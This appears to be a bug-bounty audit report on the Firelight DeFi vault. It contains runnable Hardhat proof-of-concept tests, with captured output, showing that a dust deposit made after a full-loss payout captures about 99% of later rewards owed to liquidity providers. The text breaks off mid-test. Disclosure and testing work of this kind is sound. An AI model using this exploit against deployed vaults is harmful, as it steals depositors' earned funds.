* `payout` — [#L892-L966](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L892-L966)
* Payout window includes `capturePeriod + 1` — [#L903-L907](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L903-L907)
* `assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart)` (the source of residue) — [#L911](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L911)
* Payout amount cap — [#L926-L927](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L926-L927)
* `paidFromActive` split (same-period branch) — [#L935-L938](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L935-L938)
* Post-payout assets checkpoint — [#L952](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L952)
* `totalAssets()` (net of `pendingWithdrawAssets`) — [#L427-L429](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L427-L429)
* `maxDeposit` (function spans L371-L378) — [#L371-L378](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L371-L378)
* `deposit` incident gate (`CurrentPeriodHasActiveIncident`) — [#L660](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L660)
* The inert `shares == 0` guard — [#L667-L669](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L667-L669)
* `_convertToSharesTotals` / `_convertToAssetsTotals` — [#L1058-L1074](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L1058-L1074)
* Only share burn in the contract (`_requestWithdraw`) — [#L1025](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L1025); enclosing function [#L994-L1028](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L994-L1028); request filed under `currentPeriod() + 1` [#L1008](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L1008)
* `redeem` — [#L717-L744](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L717-L744); `claimWithdraw` period guard — [#L788-L791](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L788-L791)
* `setActiveIncident` — [#L510-L513](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L510-L513)
* `_hasActiveIncident` — [#L1115-L1118](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L1115-L1118)

**`contracts/core/IncidentManager.sol`**

* Duplicate assessment-loss line rejected — [#L341-L343](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L341-L343)
* **Per-loss cap against `allocatedCoverAmount`** (`AssessmentLossAmountTooBig`) — [#L347-L356](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L347-L356), the revert itself at [#L352-L354](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L352-L354)
* `approveCurrentAssessment` (function spans L403-L439) — [#L403-L439](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L403-L439); `_decreaseIncident` call at [#L436](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L436)
* `_executePayout`: `remainderAmount = totalAssessmentLoss` at [#L643](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L643); first-loss leg gated by `if (flbPayerBalance > 0)` at [#L646](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L646); vault branch [#L672-L690](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L672-L690) with `$.vault.payout` at [#L684](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L684)
* `_decreaseIncident` -> `setActiveIncident(period, false)` — [#L819-L831](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L819-L831), the call at [#L829](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L829)

**`contracts/core/VaultRewardDistributor.sol`**

* `distributeRewards` (assets in, no shares minted; `onlyRole(DISTRIBUTOR_ROLE)` at L137) — [#L132-L153](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/VaultRewardDistributor.sol#L132-L153)
* `distributeIncentive` (function spans L163-L177) — [#L163-L177](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/VaultRewardDistributor.sol#L163-L177)

**`contracts/core/CoverOrderAllocator.sol`**

* `_computeAvailableCapacity`, first-loss buffer folded into collateral before the leverage multiply — [#L696-L725](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L696-L725), collateral sum at [#L717](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L717), `strictCapacity` at [#L719](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L719), tolerance applied at [#L721-L724](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L721-L724)
* `MAX_LEVERAGE_FACTOR = 5` — [#L82](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L82), enforced at [#L665-L666](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L665-L666)
* `MAX_DIVERGENCE_TOLERANCE_BPS = 1000` — [#L78](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L78)

**Other**

* Existing project tests that bracket but do not cover this state — `test/donations.js` (classic direction) and `test/vault_payout.js#L76` (asserts `totalAssets() == 0` after a max payout, never deposits afterwards)
* OpenZeppelin `ERC4626Upgradeable._decimalsOffset()` returning `0` — `@openzeppelin/contracts-upgradeable@5.4.0`, `contracts/token/ERC20/extensions/ERC4626Upgradeable.sol#L301-L303`

***

## Proof of Concept

Three runnable Hardhat test files, all passing against the audited commit — **9 tests, 9 passing**. All testing was performed on a **local Hardhat network**; nothing was executed against mainnet, any public testnet, or any deployed contract.

All three PoCs use only the repository's own test fixtures (`test/setup/fixtures.js`) and the repository's own mocks under `contracts/test/` (`MockIncidentManagerCoverOrderAllocator`, `MockPriceFeed`, `MockERC20`). No new contracts are introduced and no existing test or contract is modified.

### How to run

```bash
git clone https://github.com/immunefi-team/audit-comp-firelight.git
cd audit-comp-firelight
git checkout v1_audit_ready          # 42f9ea5e43d88b35197b901acc2a8c24b314fa62
npm install

# save the three files below as:
#   test/zz_poc_postdrain_dilution.js
#   test/zz_poc_postdrain_e2e.js
#   test/zz_poc_postdrain_residue.js

npx hardhat test test/zz_poc_postdrain_dilution.js
npx hardhat test test/zz_poc_postdrain_e2e.js
npx hardhat test test/zz_poc_postdrain_residue.js
```

Environment used for the output below: Node v22.12.0, Hardhat 2.22.19, default local Hardhat network. Each code block below is the file exactly as run, byte for byte; each output block below is the captured console output of that run, unedited.

### File 1 — `test/zz_poc_postdrain_dilution.js`

Demonstrates the mechanism, the realised token-level profit (through `redeem` + `claimWithdraw`, not just previews), the scaling in the dust amount, and the deposit-window lifecycle.

```javascript
const { loadFixture, time } = require("@nomicfoundation/hardhat-network-helpers");
const { deployVault } = require("./setup/fixtures.js");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const DEC = 6;
const U = (n) => ethers.parseUnits(String(n), DEC);

describe("POC: post-drain share-price collapse lets dust deposit capture later inflows", function () {
  it("attacker deposits 100 wei after a full payout and captures ~99% of the next reward distribution", async () => {
    const ctx = await loadFixture(
      deployVault.bind(null, { decimals: DEC, initial_deposit_limit: U(10_000_000) }),
    );
    const {
      token_contract: t,
      firelight_vault: v,
      payout_signer,
      payout_receiver,
      users,
      utils,
      config,
    } = ctx;
    const [alice, bob, attacker] = users;
    const D = config.period_configuration_duration;

    // --- honest LPs seed the vault -------------------------------------
    await utils.mintAndApprove(U(500_000), alice);
    await utils.mintAndApprove(U(500_000), bob);
    await v.connect(alice).deposit(U(500_000), alice.address);
    await v.connect(bob).deposit(U(500_000), bob.address);

    await time.increase(D);
    const capTs = await v.currentPeriodStart();

    expect(await v.totalAssets()).to.equal(U(1_000_000));
    const supplyBefore = await v.totalSupply();

    // --- a full-loss incident drains every active asset -----------------
    // paidAmount == activePayableAmount == totalAssets(), so paidFromActive == totalAssets()
    await v.connect(payout_signer).payout(payout_receiver.address, U(5_000_000), capTs);

    expect(await v.totalAssets(), "vault fully drained").to.equal(0n);
    expect(await v.totalSupply(), "LP shares survive the drain").to.equal(supplyBefore);
    // deposits are open: no incident flag was ever set in this minimal setup, and in the
    // real flow IncidentManager clears it in the same tx that executes the payout.
    expect(await v.maxDeposit(attacker.address)).to.be.gt(0n);

    // --- attacker deposits DUST while the share price is 0 ---------------
    const DUST = 100n; // 100 wei == 0.0001 token
    await utils.mintAndApprove(DUST, attacker);
    await v.connect(attacker).deposit(DUST, attacker.address);

    const attShares = await v.balanceOf(attacker.address);
    const supplyAfter = await v.totalSupply();
    // eslint-disable-next-line no-console
    console.log(
      `      attacker paid ${DUST} wei and now holds ${attShares} of ${supplyAfter} shares ` +
        `(${(Number((attShares * 10000n) / supplyAfter) / 100).toFixed(2)}%)`,
    );

    // --- the period's premium income is forwarded into the vault ---------
    // VaultRewardDistributor.distributeRewards does exactly this:
    //   vaultAsset.safeTransferFrom(msg.sender, address(vault), amount)
    // i.e. assets are added WITHOUT minting shares.
    const REWARD = U(200_000);
    const funder = users[0];
    await utils.mintAndApprove(REWARD, funder);
    await t.connect(funder).transfer(v.target, REWARD);

    expect(await v.totalAssets()).to.equal(REWARD + DUST);

    // --- everyone exits ---------------------------------------------------
    const cur = await v.currentPeriod();
    for (const u of [alice, bob, attacker]) {
      const s = await v.balanceOf(u.address);
      if (s > 0n) await v.connect(u).redeem(s, u.address, u.address);
    }
    await time.increase(D * 2);
    const before = {};
    for (const u of [alice, bob, attacker]) before[u.address] = await t.balanceOf(u.address);
    for (const u of [alice, bob, attacker]) {
      try {
        await v.connect(u).claimWithdraw(cur + 1n);
      } catch {}
    }

    const gained = {};
    for (const u of [alice, bob, attacker])
      gained[u.address] = (await t.balanceOf(u.address)) - before[u.address];

    const attGain = gained[attacker.address];
    const lpGain = gained[alice.address] + gained[bob.address];
    // eslint-disable-next-line no-console
    console.log(
      `      reward=${REWARD}  attacker got ${attGain}  honest LPs got ${lpGain}  ` +
        `attacker share = ${(Number((attGain * 10000n) / REWARD) / 100).toFixed(2)}%`,
    );

    // The attacker paid 100 wei and walks away with the overwhelming majority
    // of the reward that belonged to the original LPs.
    expect(attGain, "attacker profit").to.be.gt(DUST * 1000n);
    expect(attGain * 100n, "attacker takes >90% of the reward").to.be.gt(REWARD * 90n);
  });

  it("scaling: attacker share of the next inflow as a function of the dust deposit", async () => {
    for (const DUST of [1n, 10n, 100n, 1000n]) {
      const ctx = await loadFixture(
        deployVault.bind(null, { decimals: DEC, initial_deposit_limit: U(10_000_000) }),
      );
      const { token_contract: t, firelight_vault: v, payout_signer, payout_receiver, users, utils, config } =
        ctx;
      const [alice, , attacker] = users;
      await utils.mintAndApprove(U(1_000_000), alice);
      await v.connect(alice).deposit(U(1_000_000), alice.address);
      await time.increase(config.period_configuration_duration);
      await v
        .connect(payout_signer)
        .payout(payout_receiver.address, U(5_000_000), await v.currentPeriodStart());
      expect(await v.totalAssets()).to.equal(0n);

      await utils.mintAndApprove(DUST, attacker);
      await v.connect(attacker).deposit(DUST, attacker.address);

      const REWARD = U(100_000);
      await utils.mintAndApprove(REWARD, users[1]);
      await t.connect(users[1]).transfer(v.target, REWARD);

      const attVal = await v.previewRedeem(await v.balanceOf(attacker.address));
      const lpVal = await v.previewRedeem(await v.balanceOf(alice.address));
      // eslint-disable-next-line no-console
      console.log(
        `      dust=${DUST} wei -> attacker claim ${attVal} / LP claim ${lpVal} ` +
          `(attacker ${(Number((attVal * 10000n) / (REWARD + DUST)) / 100).toFixed(2)}% of inflow)`,
      );
    }
  });
});

describe("POC: deposit window is open immediately after the draining payout", function () {
  it("mirrors the IncidentManager flag lifecycle: flag set for the incident period, cleared on close, deposit lands in the same period", async () => {
    const ctx = await loadFixture(
      deployVault.bind(null, { decimals: DEC, initial_deposit_limit: U(10_000_000) }),
    );
    const { token_contract: t, firelight_vault: v, payout_signer, payout_receiver, incident, users, utils, config } = ctx;
    const [alice, funder, attacker] = users;

    await utils.mintAndApprove(U(1_000_000), alice);
    await v.connect(alice).deposit(U(1_000_000), alice.address);
    await time.increase(config.period_configuration_duration);

    const P = await v.currentPeriod();
    const capTs = await v.currentPeriodStart();

    // IncidentManager._increaseIncident -> vault.setActiveIncident(period, true)
    await v.connect(incident).setActiveIncident(P, true);
    await expect(v.connect(attacker).deposit(100n, attacker.address)).to.be.reverted;

    // approveCurrentAssessment -> _executePayout -> vault.payout(...) ; then _decreaseIncident
    await v.connect(payout_signer).payout(payout_receiver.address, U(5_000_000), capTs);
    await v.connect(incident).setActiveIncident(P, false);

    expect(await v.totalAssets()).to.equal(0n);
    expect(await v.totalSupply()).to.be.gt(0n);
    expect(await v.currentPeriod(), "still the incident period").to.equal(P);

    // deposits are open again in the very same period
    await utils.mintAndApprove(100n, attacker);
    await v.connect(attacker).deposit(100n, attacker.address);

    const REWARD = U(50_000);
    await utils.mintAndApprove(REWARD, funder);
    await t.connect(funder).transfer(v.target, REWARD);

    const attVal = await v.previewRedeem(await v.balanceOf(attacker.address));
    const lpVal = await v.previewRedeem(await v.balanceOf(alice.address));
    // eslint-disable-next-line no-console
    console.log(`      after clean incident close: attacker=${attVal} alice=${lpVal} of reward ${REWARD}`);
    expect(attVal * 100n).to.be.gt(REWARD * 90n);
  });
});
```

**Actual captured output** (`npx hardhat test test/zz_poc_postdrain_dilution.js`):

```
  POC: post-drain share-price collapse lets dust deposit capture later inflows
      attacker paid 100 wei and now holds 100000000000100 of 101000000000100 shares (99.00%)
      reward=200000000000  attacker got 198019802080  honest LPs got 1980198020  attacker share = 99.00%
    ✔ attacker deposits 100 wei after a full payout and captures ~99% of the next reward distribution (784ms)
      dust=1 wei -> attacker claim 50000000001 / LP claim 50000000000 (attacker 50.00% of inflow)
      dust=10 wei -> attacker claim 90909090919 / LP claim 9090909091 (attacker 90.90% of inflow)
      dust=100 wei -> attacker claim 99009901090 / LP claim 990099010 (attacker 99.00% of inflow)
      dust=1000 wei -> attacker claim 99900100900 / LP claim 99900100 (attacker 99.90% of inflow)
    ✔ scaling: attacker share of the next inflow as a function of the dust deposit (334ms)

  POC: deposit window is open immediately after the draining payout
      after clean incident close: attacker=49504950595 alice=495049505 of reward 50000000000
    ✔ mirrors the IncidentManager flag lifecycle: flag set for the incident period, cleared on close, deposit lands in the same period (95ms)


  3 passing (1s)
```

Note that in test 1 the figure `198019802080` is the **realised** ERC-20 balance delta after `redeem()` + `claimWithdraw()`, not a preview.

### File 2 — `test/zz_poc_postdrain_e2e.js`

The same result driven through the **real** `IncidentManager` against the **real** `FirelightVault`, with the premium routed through the **real** `VaultRewardDistributor`, plus the A/B counterfactual. This file exists separately because File 1 calls `payout()` and `setActiveIncident(false)` directly, which invites the objection "you cleared the incident flag yourself". Nothing in the repository wires the real `IncidentManager` to the real vault — `test/incidentManager/fixtures.js` uses `MockIncidentManagerVault` — so that objection had not previously been closable. Here the flag is cleared by `approveCurrentAssessment` itself, in the same transaction that empties the vault. The mock allocator is used **only** to answer `getCoverOrderMarketInfo` / `getCapacityConfigAt`; its `setVault` points at the real vault, so every vault interaction under test is real.

Note the allocated cover: `2 * 10**24` canonical units against a vault worth `10**24` canonical, i.e. **2x** the vault — exactly the envelope the mock's own `CapacityConfig` implies (`effectiveLeverage 24000 / minCAR 12000`), and well inside `MAX_LEVERAGE_FACTOR = 5`. The assessed loss is 1x vault assets, i.e. half the legitimately-allocated cover. The PoC does not invent a cover position the allocator would not permit.

```javascript
const { loadFixture, time } = require('@nomicfoundation/hardhat-network-helpers')
const { deployVault } = require('./setup/fixtures.js')
const { expect } = require('chai')
const { ethers, upgrades } = require('hardhat')

/**
 * F-10 end-to-end: a full-loss incident, driven through the REAL IncidentManager against the
 * REAL FirelightVault, leaves totalAssets() == 0 with totalSupply() > 0 and re-opens deposits in
 * the SAME transaction. A 100-wei deposit then captures ~99% of the premium the slashed LPs earned.
 *
 * Why this file exists separately from zz_poc_postdrain_dilution.js: that PoC calls `payout()` and
 * `setActiveIncident(false)` directly, which invites the objection "you cleared the incident flag
 * yourself." Nothing in the repo wires the real IncidentManager to the real vault —
 * test/incidentManager/fixtures.js uses MockIncidentManagerVault — so that objection was never
 * closed. Here the flag is cleared by IncidentManager.approveCurrentAssessment itself, in the very
 * transaction that drains the vault (_executePayout -> vault.payout, then _decreaseIncident ->
 * vault.setActiveIncident(period,false)).
 *
 * The mock CoverOrderAllocator is used ONLY to answer getCoverOrderMarketInfo/getCapacityConfigAt;
 * its `setVault` points at the real vault, so every vault interaction under test is real.
 *
 * Test 2 is the counterfactual: the identical scenario with and without the
 * attacker, asserting LP recovery ~R vs ~0.01R. That is what distinguishes this from a symmetric
 * redistribution — the LPs' earned premium is provably transferred to someone who risked 100 wei.
 */
describe('F-10 e2e: real IncidentManager drain -> dust deposit captures the LPs earned premium', function () {
  const D = 6
  const ONE = 10n ** BigInt(D)
  const CANON = 18
  const PRICE_DEC = 18
  const PRICE = 10n ** 18n // $1.00

  // _executePayout: vaultRequested = remainder * 10^priceDec / price * 10^assetDec / 10^canon
  //               = remainder / 1e12  for these decimals. So drain N fXRP => loss = N * 1e12 canonical.
  const lossForAssets = (assetBaseUnits) => assetBaseUnits * 10n ** 12n

  const rnd = async () => {
    const w = ethers.Wallet.createRandom().connect(ethers.provider)
    await ethers.provider.send('hardhat_setBalance', [w.address, '0x3635C9ADC5DEA00000'])
    return w
  }

  async function wire() {
    const ctx = await loadFixture(
      deployVault.bind(null, { decimals: D, initial_deposit_limit: (10n ** 24n).toString() }),
    )
    const { firelight_vault: v, token_contract: t, deployer } = ctx

    const curator = await rnd(), approver = await rnd(), rejecter = await rnd(),
      invalidator = await rnd(), imAdmin = await rnd(), payoutReceiver = await rnd(),
      flbWallet = await rnd(), payoutRecipient = await rnd(), distributor = await rnd()

    // Mock allocator, pointed at the REAL vault.
    const MockAlloc = await ethers.getContractFactory('MockIncidentManagerCoverOrderAllocator')
    const alloc = await MockAlloc.connect(deployer).deploy()
    await alloc.setVault(await v.getAddress())
    await alloc.setCanonicalDecimals(CANON)
    const MockERC20 = await ethers.getContractFactory('MockERC20')
    const flbToken = await MockERC20.connect(deployer).deploy('MockUSDC', 'mUSDC', 6)
    await alloc.setMockCapacityConfig({
      minCAR: 12000,
      firstLossBufferToken: await flbToken.getAddress(),
      firstLossBuffer: flbWallet.address,   // balance 0 -> first-loss leg skipped, whole loss hits the vault
      effectiveLeverage: 24000,
      minOrderMarketCoverAmount: 1,
      divergenceToleranceBps: 0,
    })

    const MockPriceFeed = await ethers.getContractFactory('MockPriceFeed')
    const priceFeed = await MockPriceFeed.connect(deployer).deploy(PRICE_DEC, PRICE)

    const IM = await ethers.getContractFactory('IncidentManager')
    const im = await upgrades.deployProxy(
      IM,
      [imAdmin.address, curator.address, approver.address, rejecter.address, invalidator.address,
        imAdmin.address, imAdmin.address, imAdmin.address, payoutReceiver.address,
        await alloc.getAddress(), await priceFeed.getAddress(), 3600],
      { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] },
    )

    // Real VaultRewardDistributor for the premium inflow.
    const VRD = await ethers.getContractFactory('VaultRewardDistributor')
    const vrd = await upgrades.deployProxy(
      VRD, [await v.getAddress(), deployer.address, distributor.address, ethers.ZeroAddress],
      { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] },
    )

    // Grant the IncidentManager the vault roles it genuinely needs in production.
    await v.connect(deployer).grantRole(await v.PAYOUT_ROLE(), await im.getAddress())
    await v.connect(deployer).grantRole(await v.INCIDENT_ROLE(), await im.getAddress())
    await v.connect(deployer).grantRole(await v.CHECKPOINT_ROLE(), await vrd.getAddress())
    await v.connect(ctx.payout_allowlister).addToPayoutAllowlist(payoutReceiver.address)

    return { ...ctx, v, t, alloc, im, vrd, priceFeed, curator, approver, payoutReceiver, payoutRecipient, distributor }
  }

  /** Drive a full-loss incident through the real IncidentManager. Returns the approve tx. */
  async function drainViaIncidentManager(w, lossCanonical, tag) {
    const { v, alloc, im, curator, approver, payoutRecipient } = w
    const capTs = await v.currentPeriodStart()
    const period = await v.currentPeriod()
    const marketId = ethers.encodeBytes32String('mkt-' + tag)
    const tokenId = 1n

    // Allocated cover = 2x the vault's assets, i.e. exactly the 2x envelope this mock's own
    // CapacityConfig implies (effectiveLeverage 24000 / minCAR 12000). The loss below is 1x.
    await alloc.setOrderMarket(tokenId, marketId, period, 2n * 10n ** 24n, payoutRecipient.address)

    const ref = ethers.keccak256(ethers.toUtf8Bytes('incident-' + tag))
    await im.connect(curator).createIncident(capTs, 'total loss', ref)
    const id = (await im.nextIncidentId()) - 1n

    // Deposits are blocked the moment the incident is filed.
    expect(await v.maxDeposit(w.users[2].address)).to.equal(0n)

    await im.connect(curator).confirmIncident(id, 'ipfs://report')
    await im.connect(curator).addAssessmentLosses(id, [{ coverTokenId: tokenId, marketId, amount: lossCanonical }])
    await im.connect(curator).submitCurrentAssessment(id)

    // Refresh the oracle: the test advanced a full period, which exceeds maxPriceAge.
    // (Unrelated to F-10 — a stale feed just reverts.)
    const now = BigInt(await time.latest())
    await w.priceFeed.setLatestRoundData(1n, PRICE, now, now, 1n)

    return im.connect(approver).approveCurrentAssessment(id)   // payout + flag-clear, one tx
  }

  it('the real IncidentManager drains the vault and re-opens deposits in the same transaction', async () => {
    const w = await wire()
    const { v, t, utils, users } = w
    const [alice, bob, attacker] = users

    await utils.mintAndApprove(500_000n * ONE, alice)
    await utils.mintAndApprove(500_000n * ONE, bob)
    await v.connect(alice).deposit(500_000n * ONE, alice.address)
    await v.connect(bob).deposit(500_000n * ONE, bob.address)
    await time.increase(w.config.period_configuration_duration)

    const assetsBefore = await v.totalAssets()
    const supplyBefore = await v.totalSupply()

    await drainViaIncidentManager(w, lossForAssets(assetsBefore), 'a')

    // The vault is empty, every LP share is still outstanding, and deposits are open again.
    expect(await v.totalAssets(), 'vault drained to exactly zero').to.equal(0n)
    expect(await v.totalSupply(), 'no shares burned by payout').to.equal(supplyBefore)
    expect(await v.maxDeposit(attacker.address), 'deposits re-opened by approveCurrentAssessment').to.be.gt(0n)

    // 100 wei now buys ~99% of the vault.
    await utils.mintAndApprove(1_000n, attacker)
    await v.connect(attacker).deposit(100n, attacker.address)
    const atkShares = await v.balanceOf(attacker.address)
    const pct = (atkShares * 10_000n) / (await v.totalSupply())
    console.log(`      attacker: 100 wei -> ${atkShares} of ${await v.totalSupply()} shares (${Number(pct) / 100}%)`)
    expect(pct).to.be.gte(9_800n) // >= 98%
  })

  it('counterfactual: the LPs earned premium goes to them without the attacker, and to the attacker with him', async () => {
    const PREMIUM = 200_000n * ONE

    // --- A: no attacker ---
    const a = await wire()
    {
      const { v, t, utils, users, vrd, distributor } = a
      const [alice, bob] = users
      await utils.mintAndApprove(500_000n * ONE, alice)
      await utils.mintAndApprove(500_000n * ONE, bob)
      await v.connect(alice).deposit(500_000n * ONE, alice.address)
      await v.connect(bob).deposit(500_000n * ONE, bob.address)
      await time.increase(a.config.period_configuration_duration)
      await drainViaIncidentManager(a, lossForAssets(await v.totalAssets()), 'a')

      // Premium for the cover that just slashed them, forwarded through the REAL distributor.
      await t.mintTo(distributor.address, PREMIUM)
      await t.connect(distributor).approve(await vrd.getAddress(), PREMIUM)
      await vrd.connect(distributor).distributeRewards(PREMIUM, await t.getAddress(), 1n, await time.latest())
      a.lpRecovery = (await v.previewRedeem(await v.balanceOf(alice.address)))
        + (await v.previewRedeem(await v.balanceOf(bob.address)))
    }

    // --- B: identical, plus a 100-wei attacker deposit right after the drain ---
    const b = await wire()
    {
      const { v, t, utils, users, vrd, distributor } = b
      const [alice, bob, attacker] = users
      await utils.mintAndApprove(500_000n * ONE, alice)
      await utils.mintAndApprove(500_000n * ONE, bob)
      await v.connect(alice).deposit(500_000n * ONE, alice.address)
      await v.connect(bob).deposit(500_000n * ONE, bob.address)
      await time.increase(b.config.period_configuration_duration)
      await drainViaIncidentManager(b, lossForAssets(await v.totalAssets()), 'a')

      await utils.mintAndApprove(1_000n, attacker)
      await v.connect(attacker).deposit(100n, attacker.address)

      await t.mintTo(distributor.address, PREMIUM)
      await t.connect(distributor).approve(await vrd.getAddress(), PREMIUM)
      await vrd.connect(distributor).distributeRewards(PREMIUM, await t.getAddress(), 1n, await time.latest())
      b.lpRecovery = (await v.previewRedeem(await v.balanceOf(alice.address)))
        + (await v.previewRedeem(await v.balanceOf(bob.address)))
      b.atkTake = await v.previewRedeem(await v.balanceOf(attacker.address))
    }

    const stolenPct = Number(((a.lpRecovery - b.lpRecovery) * 10_000n) / a.lpRecovery) / 100
    console.log(`      premium distributed        : ${PREMIUM / ONE} fXRP`)
    console.log(`      LP recovery WITHOUT attacker: ${a.lpRecovery} (${Number(a.lpRecovery / ONE)} fXRP)`)
    console.log(`      LP recovery WITH attacker   : ${b.lpRecovery} (${Number(b.lpRecovery / ONE)} fXRP)`)
    console.log(`      attacker take (paid 100 wei): ${b.atkTake} (${Number(b.atkTake / ONE)} fXRP)`)
    console.log(`      => ${stolenPct}% of the LPs earned premium transferred to the attacker`)

    // Without the attacker the LPs recover essentially the whole premium.
    expect(a.lpRecovery).to.be.gte((PREMIUM * 99n) / 100n)
    // With him they recover almost nothing, and he takes the rest for 100 wei.
    expect(b.lpRecovery).to.be.lte((PREMIUM * 5n) / 100n)
    expect(b.atkTake).to.be.gte((PREMIUM * 95n) / 100n)
    expect(stolenPct).to.be.greaterThan(90)
  })
})
```

**Actual captured output** (`npx hardhat test test/zz_poc_postdrain_e2e.js`):

```
  F-10 e2e: real IncidentManager drain -> dust deposit captures the LPs earned premium
      attacker: 100 wei -> 100000000000100 of 101000000000100 shares (99%)
    ✔ the real IncidentManager drains the vault and re-opens deposits in the same transaction (836ms)
      premium distributed        : 200000 fXRP
      LP recovery WITHOUT attacker: 200000000000 (200000 fXRP)
      LP recovery WITH attacker   : 1980198020 (1980 fXRP)
      attacker take (paid 100 wei): 198019802080 (198019 fXRP)
      => 99% of the LPs earned premium transferred to the attacker
    ✔ counterfactual: the LPs earned premium goes to them without the attacker, and to the attacker with him (618ms)


  2 passing (1s)
```

### File 3 — `test/zz_poc_postdrain_residue.js`

The **precondition** file. Everything the report claims about residue and about the ceiling is measured here rather than derived, so no number in Risk Breakdown or Impact is a hand calculation presented as output. Four tests:

1. The residue ladder `R = 0 / 1 / 10 / 100 / 1000` against `D = 100` wei.
2. Where residue comes from — a mid-period deposit survives the payout exactly, because `paidAmount` is capped by `totalAssetsAt(capturePeriodStart)`; and with 10,000 fXRP of residue the attack is dead (0.002099 fXRP take).
3. The ceiling bound — a single ordinary 1 fXRP deposit collapses the attacker's fraction from 99.01% to 0.0100%.
4. The narrowing — a payout executed in `capturePeriod + 1` after a normal period of deposits gives the attacker 0.00% of supply.

Tests 2, 3 and 4 all **weaken** the finding. They are shipped because a triager will derive them anyway, and it is better that they arrive measured and bounded than discovered and read as concealment.

```javascript
const { loadFixture, time } = require('@nomicfoundation/hardhat-network-helpers')
const { deployVault } = require('./setup/fixtures.js')
const { expect } = require('chai')
const { ethers } = require('hardhat')

/**
 * F-10, file 3: the PRECONDITION file. It measures the one thing that decides whether the
 * attack works or dies — the post-payout residue R = totalAssets() left after the payout.
 *
 * Three measurements, all against the real FirelightVault:
 *   1. The residue ladder: attacker share of the next inflow as a function of R.
 *   2. Where residue comes from: payout is capped by totalAssetsAt(capturePeriodStart)
 *      (FirelightVault.sol:911, applied at :926-927), so assets deposited AFTER the capture
 *      period start are structurally unslashable and survive as residue.
 *   3. The narrowing that kills the attack outright: a payout executed in capturePeriod + 1
 *      (permitted by _isPeriodInPayoutWindow, :905-907) leaves a whole period of deposits
 *      as residue.
 *
 * Deposits are blocked from the moment an incident is filed until it closes (:660,
 * :1115-1118), so R = 0 is what a promptly-filed incident produces; R > 0 requires deposits
 * that landed between the capture period start and the filing, or a next-period payout.
 */
const DEC = 6
const U = (n) => ethers.parseUnits(String(n), DEC)

describe('F-10 preconditions: post-payout residue is what decides the attack', function () {
  it('residue ladder: attacker share of supply and of the next inflow, as a function of R', async () => {
    const D = 100n // attacker dust, wei
    for (const R of [0n, 1n, 10n, 100n, 1000n]) {
      const ctx = await loadFixture(
        deployVault.bind(null, { decimals: DEC, initial_deposit_limit: U(10_000_000) }),
      )
      const { token_contract: t, firelight_vault: v, payout_signer, payout_receiver, users, utils, config } = ctx
      const [alice, funder, attacker] = users

      await utils.mintAndApprove(U(1_000_000), alice)
